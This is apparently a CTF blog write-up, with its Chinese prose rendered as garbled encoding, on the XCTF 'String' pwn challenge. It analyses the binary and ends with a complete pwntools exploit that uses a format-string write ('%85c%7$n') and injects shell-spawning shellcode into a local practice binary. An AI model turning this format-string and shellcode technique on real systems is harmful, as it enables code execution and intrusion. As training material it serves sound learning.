---
title: ã€ŒxCTFã€Pwn - String WriteUp
date: 2021-11-02 0:00:00
tags: ['xCtf', 'Pwn', 'WriteUp']
categories: ['CTF']
authors: [nova]
index_img: https://novanoir.moe/img/ctf_logo_1.png
banner_img: https://novanoir.moe/img/ctf_logo_1.png
---

## å†™åœ¨å¼€å¤´çš„ç¢ç¢å¿µ

æğŸå’‹è¿™ä¸ªPwnè¿™ä¹ˆéš¾çš„å•Šï¼Œçœ‹WPä¹Ÿçœ‹ä¸æ‡‚ï¼Œ~~å³åˆ»é€€å‡ºPwn~~

è¯´å½’è¯´ï¼Œè‡³å°‘å…ˆæŠŠè¿™ä¸ªæ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºç»™å®ƒå¹²äº†

ç»è¿‡å‡ å¤©çš„~~å¹¶ä¸ç³»ç»Ÿçš„ä¸‰å¤©æ‰“é±¼ä¸¤å¤©æ™’ç½‘çš„~~å­¦ä¹ ï¼Œç°åœ¨åªèƒ½è¯´éå¸¸æœ‰è‡ªä¿¡ã€‚

**String**åº”è¯¥æ˜¯æ”»é˜²ä¸–ç•Œæ–°æ‰‹åŒºé‡Œæœ€æœ‰è¶£ä¹Ÿæœ€éš¾çš„ä¸€é¢˜äº†ï¼Œå¼€æ•´ï¼

<!--truncate-->



## å¼€æ•´

### åˆ†æ
![exeinfope](https://cdn.novanoir.moe/img/image-20211101153717286.png)

![checksec](https://cdn.novanoir.moe/img/image-20211101153833049.png)

æ€»è€Œè¨€ä¹‹å…ˆæ‰«ä¸€éï¼Œ 64bitæ²¡æœ‰PIE

å…ˆçœ‹çœ‹main

![main](https://cdn.novanoir.moe/img/image-20211101153942250.png)

v4ç”³è¯·äº†ä¸€ä¸ª**8å­—èŠ‚é•¿**çš„å†…å­˜åœ°å€ï¼Œä¿å­˜çš„æ˜¯`68, 85`ä¸¤ä¸ªæ•°æ®ï¼ŒåŒæ—¶å®ƒæŠŠè¿™ä¸¤ä¸ªæ•°æ®çš„åœ°å€printäº†å‡ºæ¥

è·Ÿè¿›åˆ°`sub_400D72()`çœ‹çœ‹

![sub_400D72()](https://cdn.novanoir.moe/img/image-20211101154214749.png)

è®©æˆ‘ä»¬è¾“å…¥åå­—ï¼Œä½†æ˜¯ä¸‹é¢å¯¹sçš„é•¿åº¦åšäº†æ£€æµ‹æ‰€ä»¥æ²¡åŠæ³•æº¢å‡ºã€‚

ç»§ç»­çœ‹çœ‹å…¶ä»–å‡½æ•°ï¼Œé¦–å…ˆæ˜¯`sub_400A7D()`

![sub_400A7D()](https://cdn.novanoir.moe/img/image-20211101154750528.png)

> ä¸ºäº†è®­ç»ƒè‹±è¯­æ°´å¹³è¿™é‡Œé¡ºå¸¦æ‰“ä¸ªç¿»è¯‘(?)
>
> > è¿™æ˜¯ä¸€ä¸ªæœ‰åå´åˆ†å¤–ä¸åŒå¯»å¸¸çš„å°é…’é¦†ã€‚è¿™é‡Œç©ºæ°”æ¸…æ–°ï¼Œå¤§ç†çŸ³é“ºæˆçš„åœ°æ¿ä¹Ÿå¾ˆå¹²å‡€ã€‚å‡ ä¹çœ‹ä¸åˆ°åµé—¹çš„å®¢äººï¼Œå®¶å…·ä¹Ÿæ²¡æœ‰è¢«åœ¨è¿™ä¸ªä¸–ç•Œçš„å…¶ä»–é…’é¦†å¯»å¸¸å¯è§çš„æ‰“æ¶æ–—æ®´æ‰€æŸåã€‚è£…é¥°æå…¶åä¸½ï¼Œçœ‹ç€å¾ˆé€‚åˆæ‘†åœ¨å®«æ®¿é‡Œï¼Œä½†åœ¨è¿™ä¸ªåŸå¸‚è¿™å´æ˜¯æå…¶å¹³å¸¸çš„ã€‚æˆ¿é—´ä¸­å¤®æ˜¯å¤©é¹…ç»’è¦†ç›–çš„æ¤…å­å’Œé•¿å‡³ï¼Œæœ‰å¾ˆå¤§çš„æ©¡æœ¨æ¡Œå­å›´ç»•ã€‚ä¸€ä¸ªå¤§å‘Šç¤ºå›ºå®šåœ¨ä¸€æ ¹æœ¨æ¡åçš„åŒ—é¢çš„å¢™ä¸Šã€‚åœ¨ä¸€ä¸ªè§’è½ä½ å‘ç°äº†ä¸€ä¸ªå£ç‚‰ã€‚æœ‰ä¸¤ä¸ªæ˜æ˜¾çš„å‡ºå£ï¼šå‘ä¸œï¼Œå‘ä¸Šã€‚ä½†å¥‡æ€ªçš„æ˜¯ï¼Œå¹¶æ²¡æœ‰äººåœ¨é‚£ï¼Œé‚£ä¹ˆä½ è¦å‘å“ªé‡Œèµ°å‘¢ï¼Ÿ
>
> è¿™ä¸ªèƒŒæ™¯ä¸èƒ½è¯´æ¯«æ— å¸å¼•åŠ›åªèƒ½è¯´ç¿»è¯‘äº†æ˜¯çº¯çº¯æµªè´¹æ—¶é—´
>
> ~~æˆ‘æ˜¯å‚»å®~~

æ‰€ä»¥è¦æˆ‘ä»¬ç»™å‡ºé€‰æ‹©ï¼š`east`Or`up`

ä½†æ˜¯çœ‹ä¸‹é¢çš„ä»£ç æˆ‘ä»¬å‘ç°äº†ï¼šä½ åªèƒ½é€‰æ‹©`east`ï¼ˆé€‰æ‹©äº†`up`ä¹‹åä½ å°±ä¼šé¢ä¸´æ— å°½ä¹‹æ´ï¼‰ï¼Œç»§ç»­æ¥ä¸‹æ¥çœ‹`sub_400BB9()`

![sub_400BB9()](https://cdn.novanoir.moe/img/image-20211101173616709.png)

è¿™é‡Œæåˆ°äº†`address`ï¼Œå¾ˆå®¹æ˜“è”æƒ³åˆ°å‰é¢æˆ‘ä»¬çš„`v4`ï¼Œä¼°è®¡æ˜¯è¦åœ¨v2å’Œformatåšæ–‡ç« ï¼Œä½†æ˜¯å…·ä½“æ€ä¹ˆæ“ä½œè¿˜ä¸æ¸…æ¥šï¼Œç»§ç»­çœ‹`sub_400CA6()`

![sub_400CA6()](https://cdn.novanoir.moe/img/image-20211101174119436.png)

è¿™é‡Œçš„a1å…¶å®å°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹çš„v4ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è®©`*v4 = v4[1]`

æ³¨æ„ä¸‹`((void (__fastcall *)(_QWORD))v1)(0LL);`è¿™è¡Œï¼Œè¿™é‡ŒæŠŠv1è½¬æ¢æˆäº†å¯æ‰§è¡Œå‡½æ•°ï¼ˆvoidä¸ºè¿”å›å€¼ç±»å‹ï¼Œ__fastcallä¸ºåè®®ï¼‰ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥æ‰“shellcodeäº†ã€‚

### Payload

æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•å®ç°çš„é—®é¢˜äº†ã€‚

å…ˆæŠŠå‰é¢å‡ ä¸ªå›ºå®šæ­¥éª¤çš„å†™äº†

![exp_01](https://cdn.novanoir.moe/img/image-20211102105044906.png)



è¿™é‡Œå°±éœ€è¦å¼•å…¥æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„æ¼æ´ï¼Œ[ä¼ é€é—¨](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/)

æˆ‘ä»¬éœ€è¦æ‰¾ä¸€ä¸‹v4æ‰€åœ¨çš„å‚æ•°ä½ç½®ï¼Œä¼ å…¥payload

```python
payload = 'AAAA'+'.%x'*10
```

![addr_info](https://cdn.novanoir.moe/img/image-20211102105300535.png)

å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„`41414141`ä½äºæ ˆå†…ç¬¬å…«ä¸ªä½ç½®ï¼Œè€Œæˆ‘ä»¬åˆšæ‰å†™å…¥çš„v4_addræ˜¯ä½äºå‰ä¸€ä¸ªä½ç½®çš„ï¼Œæ­¤æ—¶

å°±å¯ä»¥æ„é€ payloadä½¿å¾—*v4=85äº†

```python
payload = '%85c%7$n'
```

![return_0](https://cdn.novanoir.moe/img/image-20211102105850378.png)

è¿™æ—¶å€™æˆ‘ä»¬å·²ç»æ»¡è¶³`sub_400CA6()`ä¸­çš„æ¡ä»¶äº†ï¼Œé‚£ä¹ˆåªéœ€è¦è½»æ¾å†™å…¥ä¸€ä¸ªshellcodeï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚

å®Œæ•´payload:

```python
from pwn import *
context(log_level='debug')

sh = process('./1d3c852354df4609bf8e56fe8e9df316')

sh.recvuntil('secret[0] is ')
v4_addr = int(sh.recvuntil('\n')[:-1], 16)
print(v4_addr)

sh.recvuntil('be:')
sh.sendline(b'yuusya')
sh.sendlineafter('east or up?:\n', b'east')
sh.sendlineafter('leave(0)?:\n', b'1')

# *v4 = 85
sh.sendlineafter("address'\n", str(v4_addr))
payload = '%85c%7$n'
sh.sendline(payload)
sh.recvuntil('I hear it')
context(arch='amd64', os='linux')
sh.sendlineafter('SPELL', asm(shellcraft.sh()))
sh.interactive()
```

